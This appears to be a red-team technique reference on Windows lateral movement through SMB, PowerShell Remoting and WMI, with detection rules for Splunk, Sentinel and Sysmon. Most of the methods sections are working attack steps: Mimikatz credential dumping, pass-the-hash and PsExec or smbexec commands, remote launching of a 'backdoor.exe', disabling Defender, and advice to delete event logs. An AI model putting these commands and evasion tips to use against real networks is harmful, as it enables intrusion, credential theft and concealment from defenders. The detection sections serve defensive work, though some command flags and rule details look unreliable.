# [LM-REMOTE-005]: SMB/RDP/PS Remoting/WMI Chaining

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-005 |
| **MITRE ATT&CK v18.1** | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016 - 2019 - 2022 - 2025 |
| **Patched In** | N/A (Technique remains active; mitigations apply) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SMB/RDP/PowerShell Remoting and WMI chaining represents a critical lateral movement attack surface in Windows environments. Attackers leverage legitimate remote access protocols (SMB for file shares and named pipes, RDP for interactive sessions, PowerShell Remoting for script execution, and WMI for system management) to move between endpoints without requiring additional tools or exploits. These protocols operate at the OS level and are deeply integrated into Windows infrastructure, making them attractive targets for adversaries who have obtained valid credentials. The attack chain typically begins with credential theft (NTLM hash, Kerberos ticket, or cleartext password) and leverages built-in Windows utilities (PsExec, DCOM, WinRS, Invoke-CimMethod) to execute code remotely.

**Attack Surface:** 
- **SMB (Port 445):** Named pipes (IPC$, ADMIN$, C$) for remote command execution
- **RDP (Port 3389):** Remote Desktop Protocol for interactive sessions
- **WinRM (Port 5985/5986):** PowerShell Remoting for script execution
- **WMI:** Distributed Component Object Model (DCOM) for system management commands

**Business Impact:** **Enables unrestricted lateral movement across the enterprise.** Once an attacker obtains valid credentials (even low-privilege user accounts), they can hop between dozens or hundreds of systems within hours. This creates a privileged escalation path to domain controllers, database servers, and sensitive data repositories. Typical impact includes data exfiltration, ransomware deployment, and persistence establishment.

**Technical Context:** These attacks are rapid—moving between 5-10 systems in under 1 hour is common. Detection is challenging because all traffic uses legitimate Windows protocols and the activity mirrors normal administrative operations. Event ID 4624 (successful logon) is generated for each lateral hop, but high-volume logon events often trigger alert fatigue. Stealth can be achieved by targeting systems with disabled audit logging or using accounts that regularly authenticate across the network (service accounts).

### Operational Risk

- **Execution Risk:** Low – No special privileges required; works with any valid credentials
- **Stealth:** Low – Generates significant event log noise (logon events, service creation events) across all target systems
- **Reversibility:** Yes – Activity can be partially undone (log files can be deleted, but forensic artifacts may persist in MFT/USN journals)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 2.1, 2.2 | Account Policies / Password Policy configuration failures |
| **DISA STIG** | WN16-AU-000030 | Audit Policy for Successful Logons |
| **CISA SCuBA** | SC.L1-3.13.2 | Multi-factor Authentication on Remote Access |
| **NIST 800-53** | AC-3, AC-6, SI-4 | Access Enforcement, Privilege Limitation, Information System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Technical measures for data integrity |
| **DORA** | Art. 9 | Protection and Prevention of ICT-Related Incidents |
| **NIS2** | Art. 21 | Cyber Risk Management Measures for Critical Operators |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Management of Privileged Access Rights; Control of Operational Software |
| **ISO 27005** | § 4.4.1 | Risk Analysis – Control of System Access |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid domain credentials (any privilege level; even unprivileged users can move laterally if target systems trust their credentials)
- **Required Access:** Network connectivity to target endpoints on port 445 (SMB), 3389 (RDP), 5985/5986 (WinRM)

**Supported Versions:**
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **PowerShell:** 5.0+ (WinRM and Invoke-CimMethod require PS 5.1+)
- **Other Requirements:** WinRM service enabled (required for PowerShell Remoting; enabled by default on Server editions, disabled by default on Client)

**Tools:**
- [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) (Sysinternals, part of Windows or via download)
- [Impacket - smbexec.py/psexec.py](https://github.com/fortra/impacket) (v0.11.0+)
- [Invoke-CimMethod / Invoke-WmiMethod](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/invoke-cimmethod) (Built-in PowerShell)
- [WinRS](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Built-in Windows, part of WinRM)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Check if SMB connectivity is available to target
Test-NetConnection -ComputerName 192.168.1.2 -Port 445
# Expected output: TcpTestSucceeded = True

# Check if WinRM is enabled on target
Test-WSMan -ComputerName 192.168.1.2
# Expected output: ProductVersion [OS=10.0.xxxxx]

# Check current user's credentials and delegation capability
whoami /groups
# Look for "INTERACTIVE", "NETWORK" groups (indicates ability to authenticate)

# Enumerate SMB shares accessible
Get-SmbShare -CimSession (New-CimSession -ComputerName 192.168.1.2)

# Check Kerberos tickets in cache (if using Kerberos authentication)
klist.exe
# Expected output: Cached tickets, service tickets (indicates valid auth context)
```

**What to Look For:**
- TcpTestSucceeded = True → SMB port is reachable
- ProductVersion present → WinRM is operational
- Multiple cached Kerberos tickets → High probability of successful lateral movement
- Service tickets (krbtgt, cifs, etc.) → Indicates domain-joined system

**Version Note:** Windows Server 2022+ has stricter default SMB1 disabling; SMB2/3 is default. Commands above use SMB2/3 by default.

### Linux/Bash / CLI Reconnaissance

```bash
# Test SMB connectivity and enumerate shares from Linux
nmap -p 445 192.168.1.2 -sV
# Expected output: 445/tcp open microsoft-ds

# Enumerate shares using Impacket
python3 -m impacket.smbclient -N //192.168.1.2/IPC$ -U "" -no-pass
# If IPC$ is accessible, SMB enumeration is possible

# Test RDP availability
nmap -p 3389 192.168.1.2 -sV
# Expected output: 3389/tcp open ms-wbt-server

# Check WinRM availability
python3 -c "import socket; s = socket.socket(); s.connect(('192.168.1.2', 5985)); print('WinRM HTTP accessible')"
# Expected output: WinRM HTTP accessible (or connection refused if disabled)
```

**What to Look For:**
- Port 445 open → SMB accessible
- Port 3389 open → RDP accessible
- Port 5985/5986 open → WinRM accessible
- IPC$ accessible → SMB enumeration possible

---

## 4. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Using PsExec (Windows - Native)

**Supported Versions:** Server 2016-2025

#### Step 1: Obtain Valid Credentials

**Objective:** Acquire NTLM hash or cleartext password of a domain user

**Command:**
```powershell
# After compromising a system, extract NTLM hash from memory (requires Local Admin)
# Using Mimikatz
mimikatz.exe
sekurlsa::logonpasswords
# Example output: Domain\Username:NTLMHASH
```

**Expected Output:**
```
Authentication Id : 0 ; 6 (192:6)
Session           : Interactive from 1
User Name         : john.doe
Domain            : CONTOSO
Logon Server      : DC01
Logon Time        : 1/10/2026 10:15:00 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
  * Username : john.doe
  * Domain   : CONTOSO
  * Password : (hash or cleartext)
  * NTLM     : 8846F7EAEE8FB117AD06BDD830B7586C
```

**What This Means:**
- NTLM hash is displayed in hex format → Can be used for Pass-the-Hash attacks
- If cleartext password is visible → Credentials can be used directly
- Logon Server shows which domain controller was used

**OpSec & Evasion:**
- Mimikatz execution may be blocked by Defender or EDR → Run from memory using reflect.dll or execute-assembly in Cobalt Strike
- Credential dumping triggers Windows Defender alerts → Disable Windows Defender before execution or run from isolated system
- Detection likelihood: High

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** User does not have Local Admin rights
  - **Fix (All Versions):** Run Mimikatz with elevated privileges or from SYSTEM context
  
- **Error:** "Win32 Exception: Access Denied"
  - **Cause:** Windows Defender or EDR is blocking Mimikatz
  - **Fix (Server 2016-2019):** Disable Windows Defender before running: `Set-MpPreference -DisableRealtimeMonitoring $true`
  - **Fix (Server 2022+):** Use Defender Bypass techniques or reflective DLL injection

**References & Proofs:**
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Windows Credential Dumping - MITRE ATT&CK](https://attack.mitre.org/techniques/T1110/)
- [Pass-the-Hash Attack - SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Lateral_Movement.pdf)

#### Step 2: Execute PsExec Lateral Movement

**Objective:** Establish remote command execution on target system using valid credentials

**Command:**
```powershell
# PsExec with NTLM hash (Pass-the-Hash)
psexec.exe \\192.168.1.2 -u CONTOSO\john.doe -p (password or use hash) cmd.exe

# PsExec with hash directly (requires Impacket on Linux or tool support)
psexec.exe \\192.168.1.2 -u CONTOSO\john.doe -H 8846F7EAEE8FB117AD06BDD830B7586C cmd.exe

# PsExec with cleartext credentials
psexec.exe \\192.168.1.2 -u CONTOSO\john.doe -p ComplexPassword123! cmd.exe

# Direct PsExec execution with command
psexec.exe \\192.168.1.2 -u CONTOSO\john.doe -p ComplexPassword123! -c C:\backdoor.exe
# Copies backdoor.exe to target and executes
```

**Command (Server 2016-2019):**
```powershell
# Works identically; SMB2 is default
psexec.exe \\192.168.1.2 -u CONTOSO\john.doe -p PASSWORD cmd.exe
```

**Command (Server 2022+):**
```powershell
# SMB3 is default; encryption may be enforced
# If SMB encryption is required:
psexec.exe \\192.168.1.2 -u CONTOSO\john.doe -p PASSWORD -smb2support cmd.exe
```

**Expected Output:**
```
PsExec v2.45 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

Connecting to 192.168.1.2...
Starting PSEXESVC service on 192.168.1.2... done
Connecting with PsExec service on 192.168.1.2...
Microsoft Windows [Version 10.0.20348]
(C) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**What This Means:**
- "Starting PSEXESVC service" → Indicates successful SMB authentication and ADMIN$ share access
- Command prompt appears → Code execution successful on remote system
- System version shows OS of target → Confirms lateral movement occurred

**OpSec & Evasion:**
- PsExec creates event ID 7045 (New Service Creation) with obvious service name "PSEXESVC" → Delete event log entries after execution
- Network SMB traffic may be detected by IDS → Use encrypted SMB3 when available or tunnel through C2 framework
- Detection likelihood: Medium (can be Low with log deletion)

**Troubleshooting:**
- **Error:** "Cannot connect to 192.168.1.2"
  - **Cause:** Network unreachable or firewall blocking port 445
  - **Fix (All Versions):** Verify network connectivity: `Test-NetConnection -ComputerName 192.168.1.2 -Port 445`

- **Error:** "Access Denied"
  - **Cause:** Invalid credentials or user lacks administrative rights on target
  - **Fix (All Versions):** Verify credentials: `net use \\192.168.1.2\IPC$ /user:CONTOSO\john.doe PASSWORD` (should succeed)

- **Error:** "The remote procedure call failed"
  - **Cause:** RPC service not running on target or firewall blocking RPC
  - **Fix (Server 2016-2019):** Enable RPC: `netsh advfirewall firewall set rule name='File and Printer Sharing' dir=in new enable=yes`
  - **Fix (Server 2022+):** Verify RPC service: `Get-Service -Name RpcSs | Select Status`

**References & Proofs:**
- [PsExec Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [Windows Admin Shares - MITRE ATT&CK T1021.002](https://attack.mitre.org/techniques/T1021/002/)
- [Lateral Movement via PsExec - Red Canary](https://redcanary.com/blog/lateral-movement/)

---

### METHOD 2: Using PowerShell Remoting (WinRM)

**Supported Versions:** Server 2016-2025 (WinRM enabled by default on Server; requires explicit enablement on Client)

#### Step 1: Enable WinRM on Target (If Disabled)

**Objective:** Activate WinRM service for PowerShell Remoting

**Command:**
```powershell
# From local system, enable WinRM (requires Local Admin)
Enable-PSRemoting -Force

# If already running, verify it's listening
Get-Service WinRM | Select Status
# Expected: Running

# Test WinRM connectivity from another system
Test-WSMan -ComputerName 192.168.1.2
```

**Version Note:** Server editions have WinRM enabled by default; Client editions do not.

**Command (Server 2016-2019):**
```powershell
# Enable WinRM with default settings
Enable-PSRemoting -Force
# WinRM listens on 5985 (HTTP) by default
```

**Command (Server 2022+):**
```powershell
# Enable WinRM; may require additional Kerberos delegation setup
Enable-PSRemoting -Force
# Verify Kerberos delegation: Get-PSSessionConfiguration | Select Name, AuthenticationOptions
```

**Expected Output:**
```
WinRM Quick Configuration
Running the WinRM Quick Configuration:
- Creates local firewall rules for WinRM traffic
- Starts the WinRM service

WinRM has been updated to receive requests.
WinRM service started successfully.
```

**OpSec & Evasion:**
- Enabling WinRM is logged (Event ID 8001) → Activity is visible in Windows Event Log
- Detection likelihood: High (enabling WinRM is suspicious outside normal operations)

**References & Proofs:**
- [Enable-PSRemoting - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting)

#### Step 2: Establish PowerShell Session to Remote System

**Objective:** Create interactive PowerShell session or execute commands remotely

**Command:**
```powershell
# Create interactive session (requires valid credentials)
$session = New-PSSession -ComputerName 192.168.1.2 -Credential (Get-Credential)
# Prompts for username and password

# Enter remote session
Enter-PSSession $session
# Now at remote C:\Users\username> prompt

# Alternative: Execute single command without interactive session
Invoke-Command -ComputerName 192.168.1.2 -Credential (Get-Credential) -ScriptBlock {
    whoami
    ipconfig
    Get-Process
}
```

**Expected Output (Interactive Session):**
```
[192.168.1.2]: PS C:\Users\john.doe\Documents>
```

**Expected Output (Command Execution):**
```
CONTOSO\john.doe
192.168.1.2: DESKTOP-ABC123D

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  : contoso.com
   IPv4 Address                     : 192.168.1.2
   Subnet Mask                      : 255.255.255.0
   Default Gateway                  : 192.168.1.1
```

**What This Means:**
- Interactive session shows remote hostname in prompt → Confirms remote code execution
- Output appears in local PowerShell window → Bidirectional communication established
- Credentials are cached → Multiple commands can be executed in sequence

**OpSec & Evasion:**
- PowerShell remoting creates WinRM Event ID 91 (New Connection) → Logged on target system
- Use `Invoke-Command` without interactive session to minimize log entries
- Consider using `New-PSSession -SessionOption (New-PSSessionOption -NoEncryption)` to avoid TLS overhead (detectable on network)
- Detection likelihood: Medium

**Troubleshooting:**
- **Error:** "A connection attempt failed because the connected party did not properly respond"
  - **Cause:** WinRM not running on target
  - **Fix (All Versions):** Start WinRM service: `Start-Service -Name WinRM` (requires Local Admin on target)

- **Error:** "The credential is invalid"
  - **Cause:** Wrong password or account does not exist
  - **Fix (All Versions):** Verify credentials work with SMB: `net use \\192.168.1.2\IPC$ /user:CONTOSO\john.doe PASSWORD`

**References & Proofs:**
- [New-PSSession - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession)
- [Invoke-Command - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command)

---

### METHOD 3: Using WMI/DCOM (Invoke-CimMethod)

**Supported Versions:** Server 2016-2025

#### Step 1: Query Target System Capabilities

**Objective:** Verify WMI is accessible and enumerate processes

**Command:**
```powershell
# Test WMI connectivity to target
Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName 192.168.1.2 -Credential (Get-Credential)

# If successful, enumerates OS information
# If failed, WMI is blocked or credentials invalid
```

**Expected Output:**
```
PSComputerName : 192.168.1.2
SystemName     : DESKTOP-ABC123D
BuildNumber    : 20348
Version        : 10.0.20348
OSLanguage     : 1033
```

**What This Means:**
- WMI responds with OS details → WMI is accessible
- No authentication error → Credentials are valid for remote WMI access
- BuildNumber indicates OS version → Can tailor exploitation accordingly

**OpSec & Evasion:**
- WMI queries are logged (Event ID 5857 on Server 2012+) → Excessive queries are visible
- Detection likelihood: Medium (depends on audit policy)

#### Step 2: Execute Remote Process via WMI

**Objective:** Launch executable on remote system without creating obvious service entries

**Command:**
```powershell
# Execute command on remote system using Invoke-CimMethod
$CimSession = New-CimSession -ComputerName 192.168.1.2 -Credential (Get-Credential)

# Create process
Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "cmd.exe /c C:\backdoor.exe"
}

# Output includes ProcessId
```

**Expected Output:**
```
ProcessId ReturnValue PSComputerName
---------- ----------- --------------
       1234           0 192.168.1.2
```

**What This Means:**
- ProcessId = Process created successfully (non-zero value confirms execution)
- ReturnValue = 0 means no errors
- Command is executing on remote system asynchronously → Attacker may not see output directly

**Version Note:** Identical behavior across Server 2016-2025

**OpSec & Evasion:**
- WMI process creation does NOT create Event ID 4688 (Process Creation) in many cases → Reduces detection
- No event log for Win32_Process.Create method (depends on audit settings)
- Detection likelihood: Low (compared to PsExec or WinRM)

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** User credentials lack administrative rights on target
  - **Fix (All Versions):** Verify admin rights: Domain admins or local admins of target system

- **Error:** "The RPC server is unavailable"
  - **Cause:** RPC or WMI service not running on target
  - **Fix (Server 2016-2019):** Start WMI service: `net start winmgmt`
  - **Fix (Server 2022+):** `Restart-Service -Name winmgmt`

**References & Proofs:**
- [Invoke-CimMethod - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/invoke-cimmethod)
- [WMI Lateral Movement - SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Lateral_Movement.pdf)

---

### METHOD 4: Using Impacket smbexec.py (Linux/Cross-Platform)

**Supported Versions:** Server 2016-2025 (SMB protocol is consistent)

#### Step 1: Install and Configure Impacket

**Objective:** Set up Impacket framework on attacker system

**Command:**
```bash
# Install Impacket
pip3 install impacket

# Verify installation
python3 -m impacket.smbexec -h
# Should display help menu

# Alternatively, clone from GitHub
git clone https://github.com/fortra/impacket.git
cd impacket
python3 setup.py install
```

**Expected Output:**
```
Impacket v0.12.0-dev - Copyright 2023 Fortra

usage: smbexec.py [-h] [--help-all] [-share SHARE] [-mode {SERVER,SHARE}] 
                   [-ts] [-codec CODEC] [-target-ip ip address]
                   [-port [destination port]] [-timeout TIMEOUT]
                   [-k] [-aesKey hex key] [-hashes LMHASH:NTHASH]
                   [-no-pass] [-p PORT]
                   target [command]
```

**OpSec & Evasion:**
- Installing Impacket on attacker infrastructure is noisy → Attackers often use pre-compiled binaries
- Detection likelihood: N/A (attacker-side only)

#### Step 2: Execute Remote Command via smbexec.py

**Objective:** Execute arbitrary command on remote Windows system

**Command:**
```bash
# Basic execution with cleartext credentials
python3 -m impacket.smbexec CONTOSO/john.doe:ComplexPassword123!@192.168.1.2

# Using NTLM hash instead of password
python3 -m impacket.smbexec -hashes :8846F7EAEE8FB117AD06BDD830B7586C CONTOSO/john.doe@192.168.1.2

# Execute single command
python3 -m impacket.smbexec CONTOSO/john.doe:ComplexPassword123!@192.168.1.2 'whoami'

# Interactive shell (create temp service, execute commands)
python3 -m impacket.smbexec CONTOSO/john.doe:ComplexPassword123!@192.168.1.2
# Drops to C:\> prompt
```

**Expected Output (Interactive):**
```
Impacket v0.12.0-dev - Copyright 2023 Fortra
[*] Using temporary service ABBCDDE on 192.168.1.2
[*] Creating service (temporary)
[*] Running pseudo shell...
Type 'help' for list of commands

C:\>
```

**What This Means:**
- Service creation message → SMB authentication succeeded, ADMIN$ and IPC$ accessible
- Interactive prompt appears → Command execution on remote system
- Temporary service is deleted after session ends (though forensic artifacts remain)

**Version Note:** smbexec.py behavior is consistent across Windows Server 2016-2025

**OpSec & Evasion:**
- smbexec.py creates Event ID 7045 (Service Creation) with service name "ABBCDDE" or similar → Event log entries are visible
- SMB traffic is encrypted by default (SMB3) → Harder to detect at packet level, but service creation is logged
- Recommended mitigation: Delete event logs after lateral movement or use alternative methods with lower logging
- Detection likelihood: Medium-High

**Troubleshooting:**
- **Error:** "Connection reset by peer"
  - **Cause:** Firewall blocking SMB or port 445 not open
  - **Fix:** Verify connectivity: `nmap -p 445 192.168.1.2`

- **Error:** "STATUS_LOGON_FAILURE"
  - **Cause:** Invalid credentials
  - **Fix:** Test credentials separately: `smbclient -U CONTOSO/john.doe%PASSWORD //192.168.1.2/IPC$ -c "dir"`

**References & Proofs:**
- [Impacket GitHub - smbexec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
- [Impacket Documentation](https://impacket.readthedocs.io/)
- [SMB Lateral Movement - MITRE ATT&CK](https://attack.mitre.org/techniques/T1021/002/)

---

## 5. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1021.001 (RDP), T1021.002 (SMB/Admin Shares), T1021.006 (WinRM)
- **Test Names:** 
  - "RDP Lateral Movement"
  - "Lateral Movement SMB Windows Admin Shares"
  - "Lateral Movement WinRM"
  
- **Description:** Validates lateral movement across multiple protocol vectors

- **Supported Versions:** Server 2016+

- **Command:**
```powershell
# RDP lateral movement test
Invoke-AtomicTest T1021.001 -TestNumbers 1

# SMB/Admin Shares test
Invoke-AtomicTest T1021.002 -TestNumbers 1,2

# WinRM test
Invoke-AtomicTest T1021.006 -TestNumbers 1,2
```

- **Cleanup Command:**
```powershell
Invoke-AtomicTest T1021.001 -TestNumbers 1 -Cleanup
Invoke-AtomicTest T1021.002 -TestNumbers 1,2 -Cleanup
Invoke-AtomicTest T1021.006 -TestNumbers 1,2 -Cleanup
```

**Reference:** [Atomic Red Team - T1021 Remote Services](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021/T1021.md)

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Service Creation via SMB (PsExec Pattern)

**Rule Configuration:**
- **Required Index:** main, windows
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, Service_Name, Computer
- **Alert Threshold:** EventCode=7045 AND Service_Name IN ("PSEXESVC", "ABBCDDE*")
- **Applies To Versions:** All

**SPL Query:**
```
index=main sourcetype=WinEventLog:Security EventCode=7045
| where Service_Name LIKE "PSEXESVC" OR Service_Name LIKE "ABBCDDE%"
| stats count by Computer, Service_Name, User
| where count >= 1
```

**What This Detects:**
- EventCode=7045 → Service creation event
- Service_Name LIKE "PSEXESVC" → Typical PsExec service name
- Remote lateral movement indicator → Suspicious service creation from network source

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **+ New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to **Results > 0**
6. Configure **Action** → Send email to SOC team

#### Rule 2: Successful Logon from Suspicious Source

**Rule Configuration:**
- **Required Index:** main, windows
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, Computer, Account_Name, Logon_Type, Source_Network_Address
- **Alert Threshold:** EventCode=4624 AND Logon_Type=3 (Network Logon)
- **Applies To Versions:** All

**SPL Query:**
```
index=main sourcetype=WinEventLog:Security EventCode=4624 
| where Logon_Type=3 
| where NOT Source_Network_Address IN (gateway_ips, jump_box_ips, vpn_ips)
| stats count by Computer, Account_Name, Source_Network_Address
| where count > 5
```

**What This Detects:**
- EventCode=4624 → Successful logon
- Logon_Type=3 → Network logon (SMB, RDP, WinRM)
- Multiple logons from internal IP not in whitelist → Lateral movement pattern

**False Positive Analysis:**
- **Legitimate Activity:** Scheduled backup tasks, replication services, group policy application
- **Benign Tools:** WSUS, SCCM, backup software
- **Tuning:** Exclude service accounts: `| where Account_Name NOT LIKE "svc_%"`

#### Rule 3: WMI Process Creation Events

**Rule Configuration:**
- **Required Index:** main, windows
- **Required Sourcetype:** WinEventLog:System, WinEventLog:Security
- **Required Fields:** EventCode, Image, ParentImage, CommandLine
- **Alert Threshold:** EventCode=5857 (WMI Event)
- **Applies To Versions:** Server 2012+

**SPL Query:**
```
index=main sourcetype=WinEventLog:System EventCode=5857
| where Image LIKE "%wmiprvse.exe%" AND ParentImage LIKE "%svchost.exe%"
| stats count by Computer, Image, CommandLine
| where count > 0
```

**What This Detects:**
- EventCode=5857 → WMI remote activity
- wmiprvse process creation → WMI provider executing
- Suspicious CommandLine parameters → Arbitrary code execution via WMI

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Service Creation Pattern Detection

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, Computer, Activity, SubjectUserName, Process
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All (requires Windows Security logging)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 7045
| where Process has_any ("PSEXESVC", "ABBCDDE", "WinRM")
| extend SourceIP = extract(@"\[(.+?)\]", 1, Process)
| summarize Count = count(), Services = make_set(Process) by Computer, SubjectUserName, SourceIP
| where Count > 2 or Services contains "PSEXESVC"
| project-reorder Computer, SubjectUserName, Count, Services
```

**What This Detects:**
- SecurityEvent where EventID = 7045 → Service creation events
- Process matches lateral movement tools → PSEXESVC, ABBCDDE, WinRM
- Summarize by Computer → Groups events by target system
- Multiple services or specific patterns → Indicates coordinated lateral movement

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Lateral Movement - Service Creation (PsExec/SMBExec)`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Set entity mapping: Computer → Host, SubjectUserName → Account
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Lateral Movement - Service Creation (PsExec/SMBExec)" `
  -Query @"
SecurityEvent
| where EventID == 7045
| where Process has_any ("PSEXESVC", "ABBCDDE", "WinRM")
| extend SourceIP = extract(@"\[(.+?)\]", 1, Process)
| summarize Count = count(), Services = make_set(Process) by Computer, SubjectUserName, SourceIP
| where Count > 2 or Services contains "PSEXESVC"
"@ `
  -Severity "High" `
  -Enabled $true
```

#### Query 2: Network Logon Spike (T1021 Pattern)

**Rule Configuration:**
- **Required Table:** SecurityEvent, SigninLogs
- **Required Fields:** EventID, Computer, TargetUserName, IpAddress, LogonType
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4624
| where LogonType has_any ("3", "10")  // Network and RDP logon types
| extend SourceIP = IpAddress
| summarize LogonCount = count() by Computer, TargetUserName, SourceIP
| where LogonCount > 5 and SourceIP startswith "10." or SourceIP startswith "192.168."
| project-reorder Computer, TargetUserName, LogonCount, SourceIP
```

**What This Detects:**
- EventID 4624 → Successful logon
- LogonType 3 (Network) or 10 (RDP) → Remote access logon types
- Multiple logons in short timeframe → Indicates lateral movement
- Internal IP addresses → Attacker hopping between internal systems

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 7045 (New Service Creation)**
- **Log Source:** Security, System
- **Trigger:** When a new service is created (typically via PsExec, smbexec, or remote service control)
- **Filter:** Service name contains "PSEXESVC", "ABBCDDE", or unknown executable path
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies - Local**
3. Enable: **Audit System** (specifically "System Change" subcategory)
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Event ID: 4624 (Successful Logon)**
- **Log Source:** Security
- **Trigger:** When a user successfully authenticates to the system
- **Filter:** LogonType=3 (Network Logon) or LogonType=10 (RDP) from internal IP not in whitelist
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Logon/Logoff**
3. Enable: **Audit Logon**
4. Set to: **Success and Failure**
5. Run `auditpol /set /subcategory:"Logon" /success:enable /failure:enable`

**Event ID: 5857 (WMI Event - Provider Started)**
- **Log Source:** System (WMI-Activity)
- **Trigger:** When WMI provider processes remote queries
- **Filter:** Provider name contains "WMI", followed by Process Creation events
- **Applies To Versions:** Server 2012+

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016-2025

```xml
<!-- Sysmon Event ID 1: Process Creation (Lateral Movement Detection) -->
<RuleGroup name="Lateral Movement - SMB/RDP/WinRM" groupRelation="or">
  <!-- PsExec service creation -->
  <Rule name="PsExec Service" onmatch="include">
    <EventID>11</EventID>
    <TargetFilename condition="contains">PSEXESVC</TargetFilename>
  </Rule>
  
  <!-- SMBExec temporary service -->
  <Rule name="SMBExec Service" onmatch="include">
    <EventID>11</EventID>
    <TargetFilename condition="matches">.*ABBCDDE.*</TargetFilename>
  </Rule>
  
  <!-- Remote process execution via WMI -->
  <Rule name="WMI Remote Process Execution" onmatch="include">
    <EventID>3</EventID>
    <DestinationPort condition="in">5985,5986</DestinationPort>
    <Image condition="contains">wmiprvse.exe</Image>
  </Rule>
  
  <!-- RDP incoming connection -->
  <Rule name="RDP Connection" onmatch="include">
    <EventID>3</EventID>
    <DestinationPort>3389</DestinationPort>
    <Protocol>tcp</Protocol>
  </Rule>
</RuleGroup>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-lateral.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-lateral.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Select EventID, Message
   ```
5. Monitor for events:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=11]]" | Select TimeCreated, Message
   ```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious process creation via service"
- **Severity:** High
- **Description:** Detects when a new service creates a suspicious process (e.g., cmd.exe, PowerShell) with command-line arguments indicating lateral movement
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** 
  1. Isolate the affected system from the network
